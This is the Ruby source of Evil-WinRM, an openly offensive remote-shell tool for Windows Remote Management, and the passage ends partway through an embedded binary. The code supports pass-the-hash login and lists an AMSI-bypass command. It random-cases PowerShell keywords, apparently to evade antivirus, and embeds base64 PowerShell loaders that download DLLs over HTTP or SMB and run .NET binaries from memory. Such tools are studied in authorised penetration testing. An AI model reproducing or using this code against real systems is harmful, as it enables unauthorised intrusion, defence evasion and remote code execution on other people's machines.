#!/usr/bin/env ruby
# frozen_string_literal: true

# Author: CyberVaca
# Twitter: https://twitter.com/CyberVaca_
# Based on the Alamot's original code

# Dependencies
require 'English'
require 'winrm'
require 'winrm-fs'
require 'stringio'
require 'base64'
require 'readline'
require 'optionparser'
require 'io/console'
require 'time'
require 'fileutils'
require 'logger'
require 'shellwords'

# Constants

# Version
VERSION = '3.7'

# Msg types
TYPE_INFO = 0
TYPE_ERROR = 1
TYPE_WARNING = 2
TYPE_DATA = 3
TYPE_SUCCESS = 4

# Global vars

# Available commands
$LIST = %w[Bypass-4MSI services upload download menu exit]
$COMMANDS = $LIST.dup
$CMDS = $COMMANDS.clone
$LISTASSEM = [''].sort
$DONUTPARAM1 = ['-process_id']
$DONUTPARAM2 = ['-donutfile']

# menu and show-global-methods commands
$MENU_CMD = ""
$SHOW_GLOBAL_METHODS_CMD = ""

$WORDS_RANDOM_CASE = [
  '[Runtime.InteropServices.Marshal]',
  'System.Runtime.InteropServices.Marshal',
  'System.Reflection.Emit.AssemblyBuilderAccess',
  'System.Reflection.CallingConventions',
  'System.Reflection.AssemblyName',
  'System.MulticastDelegate',
  'GetDelegateForFunctionPointer',
  'Import-PowerShellDataFile',
  'ImportSystemModules',
  'New-TemporaryFile',
  '.MakeByRefType',
  '.CreateType',
  '.DefineConstructor',
  '.DefineMethod',
  '.DefineDynamicModule',
  'function ',
  'WriteByte',
  '[Ref]',
  'Assembly.GetType',
  'GetField',
  '[System.Net.WebUtility]',
  'HtmlDecode',
  'Reflection.BindingFlags',
  'NonPublic',
  'Static',
  'GetValue',
  'ForEach-Object',
  'Where-Object',
  'Select-Object',
  '.name',
  'showmethods',
  'function:',
  '.CommandType',
  '-contains',
  '-notmatch',
  '-like',
  '-notlike',
  '-notcontains',
  '-and',
  'ls ',
  '$global',
  '-Property'
]

# Colors and path completion
$colors_enabled = true
$check_rpath_completion = true

# Path for ps1 scripts and exec files
$scripts_path = ''
$executables_path = ''

# Connection vars initialization
$host = ''
$port = '5985'
$user = ''
$password = ''
$url = 'wsman'
$default_service = 'HTTP'
$full_logging_path = "#{Dir.home}/evil-winrm-logs"
$user_agent = "Microsoft WinRM Client"

# Redefine download method from winrm-fs
module WinRM
  module FS
    class FileManager
      def download(remote_path, local_path, chunk_size = 1024 * 1024, first = true, size: -1)
        @logger.debug("downloading: #{remote_path} -> #{local_path} #{chunk_size}")
        index = 0
        return download_dir(remote_path, local_path, chunk_size, false) if remote_path.match?(/(\*\.?|\*\*|\.?\*|\*)/)
        output = _output_from_file(remote_path, chunk_size, index)
        return download_dir(remote_path, local_path, chunk_size, true) if output.exitcode == 2
        return false if output.exitcode >= 1

        File.open(local_path, 'wb') do |fd|
          begin
            out = _write_file(fd, output)
            index += out.length
            until out.empty?
              yield index, size if size != -1
              output = _output_from_file(remote_path, chunk_size, index)
              return false if output.exitcode >= 1

              out = _write_file(fd, output)
              index += out.length
            end
          rescue EstandardError => err
            @logger.debug("IO Failed: " + err.to_s)
            raise
          end
        end
      end

      def download_dir(remote_path, local_path, chunk_size, first)
        index_exp = remote_path.index(/(\*\.?|\*\*|\.?\*|\*)/) || 0
        remote_file_path = remote_path

        if index_exp > 0
          index_last_folder = remote_file_path.rindex(/[\\\/]/, index_exp)
          remote_file_path = remote_file_path[0..index_last_folder-1]
        end

        FileUtils.mkdir_p(local_path) unless File.directory?(local_path)
        command = "Get-ChildItem #{remote_path} | Select-Object Name"

        @connection.shell(:powershell) { |e| e.run(command) }.stdout.strip.split(/\n/).drop(2).each do |file|
          download(File.join(remote_file_path.to_s, file.strip), File.join(local_path, file.strip), chunk_size, false)
        end
      end

      true
    end
  end
end

# Class creation
class EvilWinRM
  # Initialization
  def initialize
    @psLoaded = false
    @directories = {}
    @cache_ttl = 10
    @executables = []
    @functions = []
    @Bypass_4MSI_loaded = false
  end

  # Remote path completion compatibility check
  def completion_check
    if $check_rpath_completion == true
      begin
        Readline.quoting_detection_proc
        @completion_enabled = true
      rescue NotImplementedError, NoMethodError => e
        @completion_enabled = false
           print_message("Remote path completions is disabled due to ruby limitation: #{e}", TYPE_WARNING)
           print_message('For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion', TYPE_DATA)
      end
    else
      @completion_enabled = false
      print_message('Remote path completion is disabled', TYPE_WARNING)
    end
  end

  # Arguments
  def arguments
    options = { port: $port, url: $url, service: $service, user_agent: $user_agent }
    optparse = OptionParser.new do |opts|
      opts.banner = 'Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-a USERAGENT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]'
      opts.on('-S', '--ssl', 'Enable ssl') do |_val|
        $ssl = true
        options[:port] = '5986'
      end
      opts.on('-a', '--user-agent USERAGENT', 'Specify connection user-agent (default Microsoft WinRM Client)') do |val|
        options[:user_agent] = val
      end
      opts.on('-c', '--pub-key PUBLIC_KEY_PATH', 'Local path to public key certificate') do |val|
        options[:pub_key] = val
      end
      opts.on('-k', '--priv-key PRIVATE_KEY_PATH', 'Local path to private key certificate') do |val|
        options[:priv_key] = val
      end
      opts.on('-r', '--realm DOMAIN',
              'Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }') do |val|
        options[:realm] = val.upcase
      end
      opts.on('-s', '--scripts PS_SCRIPTS_PATH', 'Powershell scripts local path') do |val|
        options[:scripts] = val
      end
      opts.on('--spn SPN_PREFIX', 'SPN prefix for Kerberos auth (default HTTP)') { |val| options[:service] = val }
      opts.on('-e', '--executables EXES_PATH', 'C# executables local path') { |val| options[:executables] = val }
      opts.on('-i', '--ip IP', 'Remote host IP or hostname. FQDN for Kerberos auth (required)') do |val|
        options[:ip] = val
      end
      opts.on('-U', '--url URL', 'Remote url endpoint (default /wsman)') { |val| options[:url] = val }
      opts.on('-u', '--user USER', 'Username (required if not using kerberos)') { |val| options[:user] = val }
      opts.on('-p', '--password PASS', 'Password') { |val| options[:password] = val }
      opts.on('-H', '--hash HASH', 'NTHash') do |val|
        if !options[:password].nil? && !val.nil?
          print_header
          print_message('You must choose either password or hash auth. Both at the same time are not allowed', TYPE_ERROR)
          custom_exit(1, false)
        end
        unless val.match(/^[a-fA-F0-9]{32}$/)
          print_header
          print_message('Invalid hash format', TYPE_ERROR)
          custom_exit(1, false)
        end
        options[:password] = "00000000000000000000000000000000:#{val}"
      end
      opts.on('-P', '--port PORT', 'Remote host port (default 5985)') { |val| options[:port] = val }
      opts.on('-V', '--version', 'Show version') do |_val|
        puts("v#{VERSION}")
        custom_exit(0, false)
      end
      opts.on('-n', '--no-colors', 'Disable colors') do |_val|
        $colors_enabled = false
      end
      opts.on('-N', '--no-rpath-completion', 'Disable remote path completion') do |_val|
        $check_rpath_completion = false
      end
      opts.on('-l', '--log', 'Log the WinRM session') do |_val|
        $log = true
        $filepath = ''
        $logfile = ''
        $logger = ''
      end
      opts.on('-h', '--help', 'Display this help message') do
        print_header
        puts
        puts(opts)
        custom_exit(0, false)
      end
    end

    begin
      optparse.parse!
      mandatory = if options[:realm].nil? && options[:priv_key].nil? && options[:pub_key].nil?
                    %i[ip user]
                  else
                    [:ip]
                  end
      missing = mandatory.select { |param| options[param].nil? }
      raise OptionParser::MissingArgument, missing.join(', ') unless missing.empty?
    rescue OptionParser::InvalidOption, OptionParser::MissingArgument
      print_header
      print_message($ERROR_INFO.to_s, TYPE_ERROR, true, $logger)
      puts
      puts(optparse)
      custom_exit(1, false)
    end

    if options[:password].nil? && options[:realm].nil? && options[:priv_key].nil? && options[:pub_key].nil?
      options[:password] = $stdin.getpass(prompt = 'Enter Password: ')
    end

    $host = options[:ip]
    $user = options[:user]
    $password = options[:password]
    $port = options[:port]
    $scripts_path = options[:scripts]
    $executables_path = options[:executables]
    $url = options[:url]
    $pub_key = options[:pub_key]
    $priv_key = options[:priv_key]
    $realm = options[:realm]
    $service = options[:service]
    $user_agent = options[:user_agent]
    unless $log.nil?

      FileUtils.mkdir_p $full_logging_path

      FileUtils.mkdir_p "#{$full_logging_path}/#{Time.now.strftime('%Y%d%m')}"

      FileUtils.mkdir_p "#{$full_logging_path}/#{Time.now.strftime('%Y%d%m')}/#{$host}"

      $filepath = "#{$full_logging_path}/#{Time.now.strftime('%Y%d%m')}/#{$host}/#{Time.now.strftime('%H%M%S')}"
      $logger = Logger.new($filepath)
      $logger.formatter = proc do |_severity, datetime, _progname, msg|
        "#{datetime}: #{msg}\n"
      end
    end
    return if $realm.nil?
    return unless $service.nil?

    $service = $default_service
  end

  # Print script header
  def print_header
    print_message("Evil-WinRM shell v#{VERSION}", TYPE_INFO, false)
  end

  # Generate connection object
  def connection_initialization
    if $ssl
      $conn = if $pub_key && $priv_key
                WinRM::Connection.new(
                  endpoint: "https://#{$host}:#{$port}/#{$url}",
                  user: $user,
                  password: $password,
                  no_ssl_peer_verification: true,
                  transport: :ssl,
                  client_cert: $pub_key,
                  client_key: $priv_key,
                  user_agent: $user_agent
                )
              else
                WinRM::Connection.new(
                  endpoint: "https://#{$host}:#{$port}/#{$url}",
                  user: $user,
                  password: $password,
                  no_ssl_peer_verification: true,
                  transport: :ssl,
                  user_agent: $user_agent
                )
              end

    elsif !$realm.nil?
      $conn = WinRM::Connection.new(
        endpoint: "http://#{$host}:#{$port}/#{$url}",
        user: '',
        password: '',
        transport: :kerberos,
        realm: $realm,
        service: $service,
        user_agent: $user_agent
      )
    else
      $conn = WinRM::Connection.new(
        endpoint: "http://#{$host}:#{$port}/#{$url}",
        user: $user,
        password: $password,
        no_ssl_peer_verification: true,
        user_agent: $user_agent
      )
    end
  end

  # Detect if a docker environment
  def docker_detection
    return true if File.exist?('/.dockerenv')

    false
  end

  # Define colors
  def colorize(text, color = 'default')
    colors = { 'default' => '38', 'blue' => '34', 'red' => '31', 'yellow' => '1;33', 'magenta' => '35',
               'green' => '1;32' }
    color_code = colors[color]
    "\001\033[0;#{color_code}m\002#{text}\001\033[0m\002"
  end

  # Messsage printing
  def print_message(msg, msg_type=TYPE_INFO, prefix_print=true, log=nil)
    if msg_type == TYPE_INFO then
      msg_prefix = "Info: "
      color = "blue"
    elsif msg_type == TYPE_WARNING then
      msg_prefix = "Warning: "
      color = "yellow"
    elsif msg_type == TYPE_ERROR then
      msg_prefix = "Error: "
      color = "red"
    elsif msg_type == TYPE_DATA then
      msg_prefix = "Data: "
      color = 'magenta'
    elsif msg_type == TYPE_SUCCESS then
      color = 'green'
    else
      msg_prefix = ""
      color = "default"
    end

    if !prefix_print then
      msg_prefix = ""
    end

    puts('                                        ')

    if $colors_enabled then
      puts(self.colorize("#{msg_prefix}#{msg}", color))
    else
      puts("#{msg_prefix}#{msg}")
    end

    if !log.nil?
      log.info("#{msg_prefix}#{msg}")
    end
  end

  # SSL validation
  def check_ssl(pub_key, priv_key)
    pub_key = pub_key.to_s
    priv_key = priv_key.to_s
    if $ssl
      unless pub_key.empty? && priv_key.empty? then
        unless [pub_key, priv_key].all? {|f| File.exist?(f) } then
          print_message("Path to provided public certificate file \"#{pub_key}\" can't be found. Check filename or path", TYPE_ERROR, true, $logger) unless File.exist?(pub_key)

          print_message("Path to provided private certificate file \"#{priv_key}\" can't be found. Check filename or path", TYPE_ERROR, true, $logger) unless File.exist?(priv_key)

          custom_exit(1)
        end
      end
      print_message('SSL enabled', TYPE_WARNING)
    else
      print_message("Useless cert/s provided, SSL is not enabled", TYPE_WARNING, true, $logger) unless pub_key.empty? && priv_key.empty?
    end
  end

  # Directories validation
  def check_directories(path, purpose)
    if path == ''
      print_message("The directory used for #{purpose} can't be empty. Please set a path", TYPE_ERROR, true, $logger)
      custom_exit(1)
    end

    if !(/cygwin|mswin|mingw|bccwin|wince|emx/ =~ RUBY_PLATFORM).nil?
      # Windows
      path.concat('\\') if path[-1] != '\\'
    elsif path[-1] != '/'
      # Unix
      path.concat('/')
    end

    unless File.directory?(path)
      print_message("The directory \"#{path}\" used for #{purpose} was not found", TYPE_ERROR, true, $logger)
      custom_exit(1)
    end

    case purpose
    when 'scripts'
      $scripts_path = path
    when 'executables'
      $executables_path = path
    end
  end

  # Silent warnings
  def silent_warnings
    old_stderr = $stderr
    $stderr = StringIO.new
    yield
  ensure
    $stderr = old_stderr
  end

  # Read powershell script files
  def read_scripts(scripts)
    files = Dir.entries(scripts).select { |f| File.file? File.join(scripts, f) } || []
    files.grep(/^*\.(ps1|psd1|psm1)$/)
  end

  # Read executable files
  def read_executables(executables)
    Dir.glob("#{executables}*.exe", File::FNM_DOTMATCH)
  end

  # Read local files and directories names
  def paths(a_path)
    parts = get_dir_parts(a_path)
    my_dir = parts[0]
    grep_for = parts[1]

    my_dir = File.expand_path(my_dir)
    my_dir += '/' unless my_dir[-1] == '/'

    files = Dir.glob("#{my_dir}*", File::FNM_DOTMATCH)
    directories = Dir.glob("#{my_dir}*").select { |f| File.directory? f }

    result = (files + directories) || []

    result.grep(/^#{Regexp.escape(my_dir)}#{grep_for}/i).uniq
  end

  # Custom exit
  def custom_exit(exit_code = 0, message_print = true)
    if message_print
      case exit_code
      when 0
        print_message("Exiting with code #{exit_code}", TYPE_INFO, true, $logger)
      when 1
        print_message("Exiting with code #{exit_code}", TYPE_ERROR, true, $logger)
      when 130
        print_message('Exiting...', TYPE_INFO, true, $logger)
      else
        print_message("Exiting with code #{exit_code}", TYPE_ERROR, true, $logger)
      end
    end
    exit(exit_code)
  end

  # Progress bar
  def progress_bar(bytes_done, total_bytes)
    progress = ((bytes_done.to_f / total_bytes) * 100).round
    progress_bar = (progress / 10).round
    progress_string = '▓' * (progress_bar - 1).clamp(0, 9)
    progress_string = "#{progress_string}▒#{'░' * (10 - progress_bar)}"
    message = "Progress: #{progress}% : |#{progress_string}|          \r"
    $stdout.print message
  end

  # Get filesize
  def filesize(shell, path)
    shell.run("(get-item '#{path}').length").output.strip.to_i
  end

  # Main function
  def main
    arguments
    connection_initialization
    file_manager = WinRM::FS::FileManager.new($conn)
    print_header
    completion_check

    # Log check
    print_message("Logging Enabled. Log file: #{$filepath}", TYPE_WARNING, true) unless $log.nil?

    # SSL checks
    check_ssl($pub_key, $priv_key)

    # Kerberos checks
    if !$user.nil? && !$realm.nil?
      print_message('User is not needed for Kerberos auth. Ticket will be used', TYPE_WARNING, true, $logger)
    end

    if !$password.nil? && !$realm.nil?
      print_message('Password is not needed for Kerberos auth. Ticket will be used', TYPE_WARNING, true, $logger)
    end

    if $realm.nil? && !$service.nil?
      print_message('Useless spn provided, only used for Kerberos auth', TYPE_WARNING, true, $logger)
    end

    unless $scripts_path.nil?
      check_directories($scripts_path, 'scripts')
      @functions = read_scripts($scripts_path)
      silent_warnings do
        $LIST = $LIST + @functions
      end
    end

    unless $executables_path.nil?
      check_directories($executables_path, 'executables')
      @executables = read_executables($executables_path)
    end
    dllloader = Base64.decode64('ZnVuY3Rpb24gRGxsLUxvYWRlciB7CiAgICBwYXJhbShbc3dpdGNoXSRzbWIsIFtzd2l0Y2hdJGxvY2FsLCBbc3dpdGNoXSRodHRwLCBbc3RyaW5nXSRwYXRoKQoKICAgICRoZWxwPUAiCi5TWU5PUFNJUwogICAgZGxsIGxvYWRlci4KICAgIFBvd2VyU2hlbGwgRnVuY3Rpb246IERsbC1Mb2FkZXIKICAgIEF1dGhvcjogSGVjdG9yIGRlIEFybWFzICgzdjRTaTBOKQoKICAgIFJlcXVpcmVkIGRlcGVuZGVuY2llczogTm9uZQogICAgT3B0aW9uYWwgZGVwZW5kZW5jaWVzOiBOb25lCi5ERVNDUklQVElPTgogICAgLgouRVhBTVBMRQogICAgRGxsLUxvYWRlciAtc21iIC1wYXRoIFxcMTkyLjE2OC4xMzkuMTMyXFxzaGFyZVxcbXlEbGwuZGxsCiAgICBEbGwtTG9hZGVyIC1sb2NhbCAtcGF0aCBDOlxVc2Vyc1xQZXBpdG9cRGVza3RvcFxteURsbC5kbGwKICAgIERsbC1Mb2FkZXIgLWh0dHAgLXBhdGggaHR0cDovL2V4YW1wbGUuY29tL215RGxsLmRsbAoKICAgIERlc2NyaXB0aW9uCiAgICAtLS0tLS0tLS0tLQogICAgRnVuY3Rpb24gdGhhdCBsb2FkcyBhbiBhcmJpdHJhcnkgZGxsCiJACgogICAgaWYgKCgkc21iIC1lcSAkZmFsc2UgLWFuZCAkbG9jYWwgLWVxICRmYWxzZSAtYW5kICRodHRwIC1lcSAkZmFsc2UpIC1vciAoJHBhdGggLWVxICIiIC1vciAkcGF0aCAtZXEgJG51bGwpKQogICAgewogICAgICAgIHdyaXRlLWhvc3QgIiRoZWxwYG4iCiAgICB9CiAgICBlbHNlCiAgICB7CgogICAgICAgIGlmICgkaHR0cCkKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLUhvc3QgIlsrXSBSZWFkaW5nIGRsbCBieSBIVFRQIgogICAgICAgICAgICAkd2ViY2xpZW50ID0gW05ldC5XZWJDbGllbnRdOjpuZXcoKQogICAgICAgICAgICAkZGxsID0gJHdlYmNsaWVudC5Eb3dubG9hZERhdGEoJHBhdGgpCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIGlmKCRzbWIpeyBXcml0ZS1Ib3N0ICJbK10gUmVhZGluZyBkbGwgYnkgU01CIiB9CiAgICAgICAgICAgIGVsc2UgeyBXcml0ZS1Ib3N0ICJbK10gUmVhZGluZyBkbGwgbG9jYWxseSIgfQoKICAgICAgICAgICAgJGRsbCA9IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygkcGF0aCkKICAgICAgICB9CiAgICAgICAgCgogICAgICAgIGlmICgkZGxsIC1uZSAkbnVsbCkKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLUhvc3QgIlsrXSBMb2FkaW5nIGRsbC4uLiIKICAgICAgICAgICAgJGFzc2VtYmx5X2xvYWRlZCA9IFtTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseV06OkxvYWQoJGRsbCkKICAgICAgICAgICAgJG9iaiA9ICgoJGFzc2VtYmx5X2xvYWRlZC5HZXRFeHBvcnRlZFR5cGVzKCkgfCBTZWxlY3QtT2JqZWN0IERlY2xhcmVkTWV0aG9kcyApLkRlY2xhcmVkTWV0aG9kcyB8IFdoZXJlLU9iamVjdCB7JF8uaXNwdWJsaWMgLWVxICR0cnVlfSB8IFNlbGVjdC1PYmplY3QgRGVjbGFyaW5nVHlwZSxuYW1lIC1VbmlxdWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgKQogICAgICAgICAgICBbYXJyYXldJG1ldGhvZHMgPSBmb3JlYWNoICgkYXNzZW1ibHlwcm9wZXJ0aWVzIGluICRvYmopIHsgJG5hbWVzcGFjZSA9ICRhc3NlbWJseXByb3BlcnRpZXMuRGVjbGFyaW5nVHlwZS50b3N0cmluZygpOyAkbWV0b2RvID0gJGFzc2VtYmx5cHJvcGVydGllcy5uYW1lLnRvc3RyaW5nKCk7ICJbIiArICRuYW1lc3BhY2UgKyAiXSIgKyAiOjoiICsgJG1ldG9kbyArICIoKSIgfQogICAgICAgICAgICAkbWV0aG9kcyA9ICRtZXRob2RzIHwgU2VsZWN0LU9iamVjdCAtVW5pcXVlIDsgJGdsb2JhbDpzaG93bWV0aG9kcyA9ICAgKCRtZXRob2RzfCB3aGVyZSB7ICRnbG9iYWw6c2hvd21ldGhvZHMgIC1ub3Rjb250YWlucyAkX30pIHwgZm9yZWFjaCB7IiRfYG4ifQogICAgICAgICAgICAKICAgICAgICB9CiAgICB9Cn0=')
    invokeBin = Base64.decode64('ZnVuY3Rpb24gSW52b2tlLUJpbmFyeSB7cGFyYW0oJGFyZykKICAgICRoZWxwPUAiCi5TWU5PUFNJUwogICAgRXhlY3V0ZSBiaW5hcmllcyBmcm9tIG1lbW9yeS4KICAgIFBvd2VyU2hlbGwgRnVuY3Rpb246IEludm9rZS1CaW5hcnkKICAgIEF1dGhvcjogTHVpcyBWYWNhcyAoQ3liZXJWYWNhKQoKICAgIFJlcXVpcmVkIGRlcGVuZGVuY2llczogTm9uZQogICAgT3B0aW9uYWwgZGVwZW5kZW5jaWVzOiBOb25lCi5ERVNDUklQVElPTgogICAgCi5FWEFNUExFCiAgICBJbnZva2UtQmluYXJ5IC9vcHQvY3NoYXJwL1dhdHNvbi5leGUKICAgIEludm9rZS1CaW5hcnkgL29wdC9jc2hhcnAvQmluYXJ5LmV4ZSBwYXJhbTEscGFyYW0yLHBhcmFtMwogICAgSW52b2tlLUJpbmFyeSAvb3B0L2NzaGFycC9CaW5hcnkuZXhlICdwYXJhbTEsIHBhcmFtMiwgcGFyYW0zJwogICAgRGVzY3JpcHRpb24KICAgIC0tLS0tLS0tLS0tCiAgICBGdW5jdGlvbiB0aGF0IGV4ZWN1dGUgYmluYXJpZXMgZnJvbSBtZW1vcnkuCgoKIkAKaWYgKCRhcmcgLWVxICRudWxsKSB7JGhlbHB9IGVsc2UgewpbUmVmbGVjdGlvbi5Bc3NlbWJseV06OkxvYWQoW2J5dGVbXV1AKDc3LCA5MCwgMTQ0LCAwLCAzLCAwLCAwLCAwLCA0LCAwLCAwLCAwLCAyNTUsIDI1NSwgMCwgMCwgMTg0LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCA2NCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMTI4LCAwLCAwLCAwLCAxNCwgMzEsIDE4NiwgMTQsIDAsIDE4MCwgOSwgMjA1LCAzMywgMTg0LCAxLCA3NiwgMjA1LCAzMywgODQsIDEwNCwgMTA1LCAxMTUsIDMyLCAxMTIsIDExNCwgMTExLCAxMDMsIDExNCwgOTcsIDEwOSwgMzIsIDk5LCA5NywgMTEwLCAxMTAsIDExMSwgMTE2LCAzMiwgOTgsIDEwMSwgMzIsIDExNCwgMTE3LCAxMTAsIDMyLCAxMDUsIDExMCwgMzIsIDY4LCA3OSwgODMsIDMyLCAxMDksIDExMSwgMTAwLCAxMDEsIDQ2LCAxMywgMTMsIDEwLCAzNiwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgODAsIDY5LCAwLCAwLCA3NiwgMSwgMywgMCwgMjQ1LCAxODIsIDIzMSwgOTIsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDIyNCwgMCwgMiwgMzMsIDExLCAxLCAxMSwgMCwgMCwgMTAsIDAsIDAsIDAsIDYsIDAsIDAsIDAsIDAsIDAsIDAsIDk0LCA0MSwgMCwgMCwgMCwgMzIsIDAsIDAsIDAsIDY0LCAwLCAwLCAwLCAwLCAwLCAxNiwgMCwgMzIsIDAsIDAsIDAsIDIsIDAsIDAsIDQsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDYsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDEyOCwgMCwgMCwgMCwgMiwgMCwgMCwgMCwgMCwgMCwgMCwgMywgMCwgOTYsIDEzMywgMCwgMCwgMTYsIDAsIDAsIDE2LCAwLCAwLCAwLCAwLCAxNiwgMCwgMCwgMTYsIDAsIDAsIDAsIDAsIDAsIDAsIDE2LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAxMiwgNDEsIDAsIDAsIDc5LCAwLCAwLCAwLCAwLCA2NCwgMCwgMCwgNDAsIDMsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDk2LCAwLCAwLCAxMiwgMCwgMCwgMCwgMjEyLCAzOSwgMCwgMCwgMjgsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDMyLCAwLCAwLCA4LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCA4LCAzMiwgMCwgMCwgNzIsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDQ2LCAxMTYsIDEwMSwgMTIwLCAxMTYsIDAsIDAsIDAsIDEwMCwgOSwgMCwgMCwgMCwgMzIsIDAsIDAsIDAsIDEwLCAwLCAwLCAwLCAyLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAzMiwgMCwgMCwgOTYsIDQ2LCAxMTQsIDExNSwgMTE0LCA5OSwgMCwgMCwgMCwgNDAsIDMsIDAsIDAsIDAsIDY0LCAwLCAwLCAwLCA0LCAwLCAwLCAwLCAxMiwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgNjQsIDAsIDAsIDY0LCA0NiwgMTE0LCAxMDEsIDEwOCwgMTExLCA5OSwgMCwgMCwgMTIsIDAsIDAsIDAsIDAsIDk2LCAwLCAwLCAwLCAyLCAwLCAwLCAwLCAxNiwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgNjQsIDAsIDAsIDY2LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCA2NCwgNDEsIDAsIDAsIDAsIDAsIDAsIDAsIDcyLCAwLCAwLCAwLCAyLCAwLCA1LCAwLCAxOTYsIDMyLCAwLCAwLCAxNiwgNywgMCwgMCwgMSwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMTksIDQ4LCA2LCAwLCAxMDQsIDAsIDAsIDAsIDEsIDAsIDAsIDE3LCAwLCAxMTUsIDE1LCAwLCAwLCAxMCwgMTAsIDYsIDQwLCAxNiwgMCwgMCwgMTAsIDAsIDYsIDQwLCAxNywgMCwgMCwgMTAsIDAsIDIsIDIyLCAxNTQsIDExMSwgMTgsIDAsIDAsIDEwLCAxMSwgNywgNDAsIDE5LCAwLCAwLCAxMCwgMTIsIDgsIDQwLCAyMCwgMCwgMCwgMTAsIDEzLCA5LCAxMTEsIDIxLCAwLCAwLCAxMCwgMTksIDQsIDE3LCA0LCAyMCwgMjMsIDE0MSwgMSwgMCwgMCwgMSwgMTksIDcsIDE3LCA3LCAyMiwgMiwgMjMsIDQwLCAxLCAwLCAwLCA0MywgNDAsIDIsIDAsIDAsIDQzLCAxNjIsIDE3LCA3LCAxMTEsIDI0LCAwLCAwLCAxMCwgMzgsIDYsIDExMSwgMTgsIDAsIDAsIDEwLCAxOSwgNSwgMTcsIDUsIDE5LCA2LCA0MywgMCwgMTcsIDYsIDQyLCA2NiwgODMsIDc0LCA2NiwgMSwgMCwgMSwgMCwgMCwgMCwgMCwgMCwgMTIsIDAsIDAsIDAsIDExOCwgNTIsIDQ2LCA0OCwgNDYsIDUxLCA0OCwgNTEsIDQ5LCA1NywgMCwgMCwgMCwgMCwgNSwgMCwgMTA4LCAwLCAwLCAwLCA1NiwgMiwgMCwgMCwgMzUsIDEyNiwgMCwgMCwgMTY0LCAyLCAwLCAwLCA2OCwgMywgMCwgMCwgMzUsIDgzLCAxMTYsIDExNCwgMTA1LCAxMTAsIDEwMywgMTE1LCAwLCAwLCAwLCAwLCAyMzIsIDUsIDAsIDAsIDgsIDAsIDAsIDAsIDM1LCA4NSwgODMsIDAsIDI0MCwgNSwgMCwgMCwgMTYsIDAsIDAsIDAsIDM1LCA3MSwgODUsIDczLCA2OCwgMCwgMCwgMCwgMCwgNiwgMCwgMCwgMTYsIDEsIDAsIDAsIDM1LCA2NiwgMTA4LCAxMTEsIDk4LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAyLCAwLCAwLCAxLCA3MSwgMjEsIDIsIDAsIDksIDgsIDAsIDAsIDAsIDI1MCwgMzcsIDUxLCAwLCAyMiwgMCwgMCwgMSwgMCwgMCwgMCwgMjUsIDAsIDAsIDAsIDIsIDAsIDAsIDAsIDEsIDAsIDAsIDAsIDEsIDAsIDAsIDAsIDI0LCAwLCAwLCAwLCAxMiwgMCwgMCwgMCwgMSwgMCwgMCwgMCwgMSwgMCwgMCwgMCwgMiwgMCwgMCwgMCwgMiwgMCwgMCwgMCwgMCwgMCwgMTAsIDAsIDEsIDAsIDAsIDAsIDAsIDAsIDYsIDAsIDU1LCAwLCA0OCwgMCwgNiwgMCwgMTAxLCAwLCA3NSwgMCwgNiwgMCwgMTUwLCAwLCAxMzIsIDAsIDYsIDAsIDE3MywgMCwgMTMyLCAwLCA2LCAwLCAyMDIsIDAsIDEzMiwgMCwgNiwgMCwgMjMzLCAwLCAxMzIsIDAsIDYsIDAsIDIsIDEsIDEzMiwgMCwgNiwgMCwgMjcsIDEsIDEzMiwgMCwgNiwgMCwgNTQsIDEsIDEzMiwgMCwgNiwgMCwgODEsIDEsIDEzMiwgMCwgNiwgMCwgMTM3LCAxLCAxMDYsIDEsIDYsIDAsIDE1NywgMSwgMTM